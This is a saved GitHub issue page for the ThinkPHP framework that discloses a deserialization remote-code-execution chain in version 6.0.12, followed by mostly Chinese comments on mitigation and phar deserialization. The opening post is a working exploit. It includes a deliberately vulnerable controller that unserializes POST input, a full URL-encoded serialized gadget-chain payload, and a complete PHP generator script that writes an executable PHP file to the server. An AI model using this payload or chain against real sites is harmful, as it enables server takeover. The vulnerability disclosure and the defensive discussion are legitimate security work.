=== Content from github.com_15be864a_20250115_100335.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftop-think%2Fframework%2Fissues%2F2717)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftop-think%2Fframework%2Fissues%2F2717)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=top-think%2Fframework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[top-think](/top-think)
/
**[framework](/top-think/framework)**
Public

* [Notifications](/login?return_to=%2Ftop-think%2Fframework) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Ftop-think%2Fframework)
* [Star
   2.7k](/login?return_to=%2Ftop-think%2Fframework)

* [Code](/top-think/framework)
* [Issues
  88](/top-think/framework/issues)
* [Pull requests
  23](/top-think/framework/pulls)
* [Discussions](/top-think/framework/discussions)
* [Actions](/top-think/framework/actions)
* [Security](/top-think/framework/security)
* [Insights](/top-think/framework/pulse)

Additional navigation options

* [Code](/top-think/framework)
* [Issues](/top-think/framework/issues)
* [Pull requests](/top-think/framework/pulls)
* [Discussions](/top-think/framework/discussions)
* [Actions](/top-think/framework/actions)
* [Security](/top-think/framework/security)
* [Insights](/top-think/framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Ftop-think%2Fframework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Ftop-think%2Fframework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# ThinkPHP 6.0.12 Unserialize RCE #2717

Closed

[beicheng-maker](/beicheng-maker) opened this issue
May 24, 2022
· 18 comments

Closed

# [ThinkPHP 6.0.12 Unserialize RCE](#top) #2717

[beicheng-maker](/beicheng-maker) opened this issue
May 24, 2022
· 18 comments

## Comments

[![@beicheng-maker](https://avatars.githubusercontent.com/u/63102521?s=80&u=c772a1f09d6a5158a514cf2d6ff39e93340e566d&v=4)](/beicheng-maker)

Copy link

### **[beicheng-maker](/beicheng-maker)** commented [May 24, 2022](#issue-1246093065) • edited Loading

| ThinkPHP RCE链子 **Environment installation** test version:Thinkphp6.0.12 Environment configuration：(tp6只支持用composer安装) composer create-project topthink/think=6.0.12 tp612 Add deserialization entry point  ``` <?php  namespace app\controller;      use app\BaseController;  use think\facade\Request;  class Index extends BaseController  {      public function index()      {          $payload=Request::post('cmd');          unserialize($payload);      }          public function hello($name = 'ThinkPHP6')      {          return 'hello,' . $name;      }  } ```  ``` direct interview http://127.0.0.1  post to send package  ```  ``` cmd=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A15%3A%22think%5Croute%5CUrl%22%3A4%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A2%3A%22a%3A%22%3Bs%3A9%3A%22%00%2A%00domain%22%3Bs%3A27%3A%22%3C%3Fphp+phpinfo%28%29%3B+exit%28%29%3B+%3F%3E%22%3Bs%3A6%3A%22%00%2A%00app%22%3BO%3A16%3A%22think%5CMiddleware%22%3A1%3A%7Bs%3A7%3A%22request%22%3Bi%3A2333%3B%7Ds%3A8%3A%22%00%2A%00route%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22getDomainBind%22%3B%7Ds%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A21%3A%22League%5CFlysystem%5CFile%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00path%22%3Bs%3A10%3A%22huahua.php%22%3Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A25%3A%22think%5Csession%5Cdriver%5CFile%22%3A0%3A%7B%7D%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22huahua%22%3B%7D%7D ```  access`sess_huahua.php` successfully RCE  [20220524104905](https://user-images.githubusercontent.com/63102521/170851173-b61b92e0-ae3b-4bcf-ad4c-1911f431fc7d.png)  exp  ``` <?php   namespace think\model\concern{       trait Attribute{           private $data = ['huahua'];      }   }      namespace think\view\driver{       class Php{}   } namespace think\session\driver{     class File{      } } namespace League\Flysystem{     class File{         protected $path;         protected $filesystem;         public function __construct($File){             $this->path='huahua.php';             $this->filesystem=$File;         }     } } namespace think\console{     use League\Flysystem\File;     class Output{         protected $styles=[];         private $handle;         public function __construct($File){             $this->styles[]='getDomainBind';             $this->handle=new File($File);         }     } }   namespace think{       abstract class Model{           use model\concern\Attribute;           private $lazySave;           protected $withEvent;           protected $table;           function __construct($cmd,$File){               $this->lazySave = true;               $this->withEvent = false;               $this->table = new route\Url(new Middleware,new console\Output($File),$cmd);           }       }       class Middleware{           public $request = 2333;       }    }      namespace think\model{       use think\Model;       class Pivot extends Model{}    }      namespace think\route{       class Url       {           protected $url = 'a:';           protected $domain;           protected $app;           protected $route;           function __construct($app,$route,$cmd){               $this->domain = $cmd;               $this->app = $app;               $this->route = $route;           }       }   }      namespace{       echo urlencode(serialize(new think\Model\Pivot('<?php phpinfo(); exit(); ?>',new think\session\driver\File)));   } ``` |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
1
 huizon666 reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

[![@NEX-S](https://avatars.githubusercontent.com/u/97107165?s=80&u=55d5905c8eeb0776494b5f51ffc80d246ea3e88c&v=4)](/NEX-S)

Copy link

### **[NEX-S](/NEX-S)** commented [Jul 5, 2022](#issuecomment-1174634092)

| 安全老哥tql |
| --- |

All reactions

Sorry, something went wrong.

[![@Jiaoma](https://avatars.githubusercontent.com/u/15938427?s=80&u=c2093e745b6ad63bf9fb4aa7cf493eed665f4a8d&v=4)](/Jiaoma)

Copy link

### **[Jiaoma](/Jiaoma)** commented [Sep 1, 2022](#issuecomment-1233652804)

| 天天来此打卡，能不能官方来个人给个消息啥时候修复啊？ |
| --- |

All reactions

Sorry, something went wrong.

[![@Yurunsoft](https://avatars.githubusercontent.com/u/20104656?s=80&u=1638b8d424866e6af22d208359804ab313d3146a&v=4)](/Yurunsoft)

Copy link

### **[Yurunsoft](/Yurunsoft)** commented [Sep 1, 2022](#issuecomment-1233658449)

| 不要相信用户输入，不要直接反序列化用户传进来的数据，建议用 json 来传参数 |
| --- |

All reactions

Sorry, something went wrong.

[![@augushong](https://avatars.githubusercontent.com/u/31880431?s=80&u=7d0cd1271ae2c0fe777324c16697ea9fca864ccd&v=4)](/augushong)

Copy link

### **[augushong](/augushong)** commented [Sep 1, 2022](#issuecomment-1233661870) • edited Loading

| 是的，注意就行了。这根eval($cmd)没啥区别了。unserialize本来就应该在信任的数据中执行。 |
| --- |

All reactions

Sorry, something went wrong.

[![@beicheng-maker](https://avatars.githubusercontent.com/u/63102521?s=80&u=c772a1f09d6a5158a514cf2d6ff39e93340e566d&v=4)](/beicheng-maker)

Copy link

Author

### **[beicheng-maker](/beicheng-maker)** commented [Sep 1, 2022](#issuecomment-1233774264)

| 是的，注意就行了。这根eval($cmd)没啥区别了。unserialize本来就应该在信任的数据中执行。  可能影响比较大的还是phar反序列化，因为上传文件是没有办法检测其正规内容的，网上只是爆出来了一些php函数支持phar协议，或许其他扩展还会有。 |
| --- |

All reactions

Sorry, something went wrong.

[![@augushong](https://avatars.githubusercontent.com/u/31880431?s=80&u=7d0cd1271ae2c0fe777324c16697ea9fca864ccd&v=4)](/augushong)

Copy link

### **[augushong](/augushong)** commented [Sep 1, 2022](#issuecomment-1233792177)

| 再安全点，就是用第三方存储，程序和数据分离。php-fpm环境确实有这种问题。 |
| --- |

All reactions

Sorry, something went wrong.

[![@Yurunsoft](https://avatars.githubusercontent.com/u/20104656?s=80&u=1638b8d424866e6af22d208359804ab313d3146a&v=4)](/Yurunsoft)

Copy link

### **[Yurunsoft](/Yurunsoft)** commented [Sep 1, 2022](#issuecomment-1233817869)

| 是的，注意就行了。这根eval($cmd)没啥区别了。unserialize本来就应该在信任的数据中执行。  可能影响比较大的还是phar反序列化，因为上传文件是没有办法检测其正规内容的，网上只是爆出来了一些php函数支持phar协议，或许其他扩展还会有。  上传文件目录nginx禁止php执行就完事了，最好是用对象存储 |
| --- |

All reactions

Sorry, something went wrong.

[![@beicheng-maker](https://avatars.githubusercontent.com/u/63102521?s=80&u=c772a1f09d6a5158a514cf2d6ff39e93340e566d&v=4)](/beicheng-maker)

Copy link

Author

### **[beicheng-maker](/beicheng-maker)** commented [Sep 1, 2022](#issuecomment-1233896198)

| 是的，注意就行了。这根eval($cmd)没啥区别了。unserialize本来就应该在信任的数据中执行。  可能影响比较大的还是phar反序列化，因为上传文件是没有办法检测其正规内容的，网上只是爆出来了一些php函数支持phar协议，或许其他扩展还会有。  上传文件目录nginx禁止php执行就完事了，最好是用对象存储  我觉得师傅可以去理解一下什么是phar反序列化，phar反序列化只需要满足， 1、一个支持phar协议的函数 2、一个支持上传文件的功能，上传任何后缀都可以。只需要保证内容有我们需要的即可。 |
| --- |

All reactions

Sorry, something went wrong.

[![@beicheng-maker](https://avatars.githubusercontent.com/u/63102521?s=80&u=c772a1f09d6a5158a514cf2d6ff39e93340e566d&v=4)](/beicheng-maker)

Copy link

Author

### **[beicheng-maker](/beicheng-maker)** commented [Sep 1, 2022](#issuecomment-1233899371)

| 再安全点，就是用第三方存储，程序和数据分离。php-fpm环境确实有这种问题。  是的，师傅所说的完全可以避免这种安全风险。但是可能考虑到实际的应用环境，因成本，安全等问题可能不会考虑到第三方存储等等。因为如果交给第三方，还可以会面临供应链攻击。 |
| --- |

All reactions

Sorry, something went wrong.

[![@augushong](https://avatars.githubusercontent.com/u/31880431?s=80&u=7d0cd1271ae2c0fe777324c16697ea9fca864ccd&v=4)](/augushong)

Copy link

### **[augushong](/augushong)** commented [Sep 1, 2022](#issuecomment-1233904107)

| 也不用非得第三方，自己搭一个静态站点，用ftp连上去，也行。不过这些都是运维和架构的事了。  tp的这个反序列化问题，得看看是不是会影响到特性。看样子只要使用的类库（不管是不是tp的）在反序列化时能执行东西，就有问题。 |
| --- |

All reactions

Sorry, something went wrong.

[![@beicheng-maker](https://avatars.githubusercontent.com/u/63102521?s=80&u=c772a1f09d6a5158a514cf2d6ff39e93340e566d&v=4)](/beicheng-maker)

Copy link

Author

### **[beicheng-maker](/beicheng-maker)** commented [Sep 1, 2022](#issuecomment-1233914749)

| 也不用非得第三方，自己搭一个静态站点，用ftp连上去，也行。不过这些都是运维和架构的事了。  tp的这个反序列化问题，得看看是不是会影响到特性。看样子只要使用的类库（不管是不是tp的）在反序列化时能执行东西，就有问题。  是的师傅。确实是这种的，tp的这个反序列化问题，只有一部分用到了tp的类库。其他的pop部分还是其他的类库，不过反序列化问题在实际的渗透测试环境中还是比较鸡肋的，大部分应用在白盒代码审计之中（还是蛮好用的）。在没有分离的情况下，tp5、6的二开CMS还是很多都存在这个问题的。 可能厂商考虑到反序列化问题的难以修复，以及利用的鸡肋程度。已经拒绝承认反序列化为其漏洞，包括但不限于一些PHP MVC的大厂商tp、laravel等，不过Yii还是乐于承认反序列化为漏洞，所以Yii的最新版本很少看到反序列化漏洞了。 |
| --- |

All reactions

Sorry, something went wrong.

[![@augushong](https://avatars.githubusercontent.com/u/31880431?s=80&u=7d0cd1271ae2c0fe777324c16697ea9fca864ccd&v=4)](/augushong)

Copy link

### **[augushong](/augushong)** commented [Sep 1, 2022](#issuecomment-1233942237)

| 其实还是要看下产品的成本和使用者的成本就可以了。  这种问题，如果稍微规范一点使用方式，稍微专业一点的开发和运维就能避免，那其实不需要去考虑的， 规范使用者的成本比调整产品的成本低。  其实箱laravel这种框架，都已经很流行使用serverless容器之类的东西了，肯定不会碰到上传文件的。  虽然php的发展方向咱不知道，但是如果无底线的降低使用者的成本，但是却限制了框架的发挥，也不是好事。  具体还是得看实用经验，大家可以反馈讨论一下这个事。 |
| --- |

All reactions

Sorry, something went wrong.

[![@augushong](https://avatars.githubusercontent.com/u/31880431?s=80&u=7d0cd1271ae2c0fe777324c16697ea9fca864ccd&v=4)](/augushong)

Copy link

### **[augushong](/augushong)** commented [Sep 1, 2022](#issuecomment-1233944929)

| 反正我基本没有遇到过反序列化请求数据的情况。  顶多就是序列化的数据存到数据库、对象存储或者本地存储。直接请求的还没遇到过。 |
| --- |

All reactions

Sorry, something went wrong.

[![@beicheng-maker](https://avatars.githubusercontent.com/u/63102521?s=80&u=c772a1f09d6a5158a514cf2d6ff39e93340e566d&v=4)](/beicheng-maker)

Copy link

Author

### **[beicheng-maker](/beicheng-maker)** commented [Sep 1, 2022](#issuecomment-1233953611)

| 反正我基本没有遇到过反序列化请求数据的情况。  顶多就是序列化的数据存到数据库、对象存储或者本地存储。直接请求的还没遇到过。  是phar反序列化，不是类似unserialize这样的直接去请求数据。 |
| --- |

All reactions

Sorry, something went wrong.

[![@augushong](https://avatars.githubusercontent.com/u/31880431?s=80&u=7d0cd1271ae2c0fe777324c16697ea9fca864ccd&v=4)](/augushong)

Copy link

### **[augushong](/augushong)** commented [Sep 1, 2022](#issuecomment-1233957512)

| phar包的话，很少把他当依赖加载吧。主要还是主动地去加载它，是不。 |
| --- |

All reactions

Sorry, something went wrong.

[![@beicheng-maker](https://avatars.githubusercontent.com/u/63102521?s=80&u=c772a1f09d6a5158a514cf2d6ff39e93340e566d&v=4)](/beicheng-maker)

Copy link

Author

### **[beicheng-maker](/beicheng-maker)** commented [Sep 1, 2022](#issuecomment-1233960804)

| phar包的话，很少把他当依赖加载吧。主要还是主动地去加载它，是不。  例如利用文件读取的函数file\_get\_contents()去调用phar协议来达到和unserialie一样的效果 <https://www.anquanke.com/post/id/245621> |
| --- |

All reactions

Sorry, something went wrong.

[![@Jiaoma](https://avatars.githubusercontent.com/u/15938427?s=80&u=c2093e745b6ad63bf9fb4aa7cf493eed665f4a8d&v=4)](/Jiaoma)

Copy link

### **[Jiaoma](/Jiaoma)** commented [Nov 1, 2022](#issuecomment-1298241816)

| [@beicheng-maker](https://github.com/beicheng-maker) 你好，我这边在验证这个然后写报告。我想问一下是把这个session\_huahua.php放到app/controller/底下和Index.php在同级目录吗？我这边注入了那个cmd但是好像找不到sess\_huahua.php。 我执行的url是<https://xxxx:8443?cmd=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A15%3A%22think%5Croute%5CUrl%22%3A4%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A2%3A%22a%3A%22%3Bs%3A9%3A%22%00%2A%00domain%22%3Bs%3A27%3A%22%3C%3Fphp+phpinfo%28%29%3B+exit%28%29%3B+%3F%3E%22%3Bs%3A6%3A%22%00%2A%00app%22%3BO%3A16%3A%22think%5CMiddleware%22%3A1%3A%7Bs%3A7%3A%22request%22%3Bi%3A2333%3B%7Ds%3A8%3A%22%00%2A%00route%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22getDomainBind%22%3B%7Ds%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A21%3A%22League%5CFlysystem%5CFile%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00path%22%3Bs%3A10%3A%22huahua.php%22%3Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A25%3A%22think%5Csession%5Cdriver%5CFile%22%3A0%3A%7B%7D%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22huahua%22%3B%7D%7D> |
| --- |

All reactions

Sorry, something went wrong.

[![@beicheng-maker](https://avatars.githubusercontent.com/u/63102521?s=80&u=c772a1f09d6a5158a514cf2d6ff39e93340e566d&v=4)](/beicheng-maker)

Copy link

Author

### **[beicheng-maker](/beicheng-maker)** commented [Nov 3, 2022](#issuecomment-1301621317) • edited Loading

| [@beicheng-maker](https://github.com/beicheng-maker) 你好，我这边在验证这个然后写报告。我想问一下是把这个session\_huahua.php放到app/controller/底下和Index.php在同级目录吗？我这边注入了那个cmd但是好像找不到sess\_huahua.php。 我执行的url是<https://xxxx:8443?cmd=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A15%3A%22think%5Croute%5CUrl%22%3A4%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A2%3A%22a%3A%22%3Bs%3A9%3A%22%00%2A%00domain%22%3Bs%3A27%3A%22%3C%3Fphp+phpinfo%28%29%3B+exit%28%29%3B+%3F%3E%22%3Bs%3A6%3A%22%00%2A%00app%22%3BO%3A16%3A%22think%5CMiddleware%22%3A1%3A%7Bs%3A7%3A%22request%22%3Bi%3A2333%3B%7Ds%3A8%3A%22%00%2A%00route%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22getDomainBind%22%3B%7Ds%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A21%3A%22League%5CFlysystem%5CFile%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00path%22%3Bs%3A10%3A%22huahua.php%22%3Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A25%3A%22think%5Csession%5Cdriver%5CFile%22%3A0%3A%7B%7D%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22huahua%22%3B%7D%7D>  如果你直接复制了我的payload之后是直接会在根目录生成的，你需要查找你本地绑定的是哪个目录，你可以全局搜索一下sess\_huahua.php |
| --- |

All reactions

Sorry, something went wrong.

[![@big-dream](https://avatars.githubusercontent.com/u/9215157?s=40&u=7d95e6eb595bd1249191dda0f30cda4b6c3994de&v=4)](/big-dream)
[big-dream](/big-dream)
closed this as [completed](/top-think/framework/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Feb 26, 2024](#event-11918105908)

[![@big-dream](https://avatars.githubusercontent.com/u/9215157?s=40&u=7d95e6eb595bd1249191dda0f30cda4b6c3994de&v=4)](/big-dream)
[big-dream](/big-dream)
mentioned this issue
[Apr 18, 2024](#ref-issue-2249630667)

[编辑器提示存在漏洞
#3004](/top-think/framework/issues/3004)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Ftop-think%2Fframework%2Fissues%2F2717)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

6 participants

[![@big-dream](https://avatars.githubusercontent.com/u/9215157?s=52&v=4)](/big-dream) [![@Jiaoma](https://avatars.githubusercontent.com/u/15938427?s=52&v=4)](/Jiaoma) [![@Yurunsoft](https://avatars.githubusercontent.com/u/20104656?s=52&v=4)](/Yurunsoft) [![@augushong](https://avatars.githubusercontent.com/u/31880431?s=52&v=4)](/augushong) [![@beicheng-maker](https://avatars.githubusercontent.com/u/63102521?s=52&v=4)](/beicheng-maker) [![@NEX-S](https://avatars.githubusercontent.com/u/97107165?s=52&v=4)](/NEX-S)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


